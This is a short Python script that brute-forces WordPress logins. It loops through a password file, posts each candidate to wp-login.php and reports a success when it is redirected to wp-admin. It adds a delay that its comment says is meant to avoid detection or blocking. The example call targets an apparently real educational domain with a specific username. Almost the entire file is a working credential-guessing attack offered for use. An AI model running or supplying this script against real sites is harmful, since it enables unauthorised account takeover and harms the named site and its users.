#!/usr/bin/python3
"""
This script demonstrates how to brute force WordPress login using Python requests.
"""

import requests
import time

def brute_force_login(url, username, password_file, attempts=1000):
    """Attempt to login to WordPress using username and password list."""
    
    # Load passwords
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Password file '{password_file}' not found.")
        return
    
    # Prepare login data
    login_data = {
        'log': username,
        'pwd': '',
        'redirect_to': f"{url}/wp-admin/",
        'testcookie': '1',
        'wp-submit': 'Log In'
    }
    
    # Try each password
    for password in passwords[:attempts]:
        login_data['pwd'] = password
        
        try:
            # Send login request
            response = requests.post(
                f"{url}/wp-login.php", 
                data=login_data, 
                allow_redirects=True,
                timeout=5
            )
            
            # Check if login was successful
            if response.status_code == 200 and 'wp-admin' in response.url:
                print(f"[SUCCESS] Username: {username}, Password: {password}")
                return
                
            # Avoid detection/blocking
            time.sleep(1)
            
        except Exception as e:
            print(f"Error during request: {e}")
    
    print("[FAILED] No valid credentials found.")

if __name__ == "__main__":
    # Example usage
    brute_force_login(
        "https://winsome.edu.pk", 
        "yourdeveloperhammad", 
        "passwords.txt", 
        attempts=1000
    )
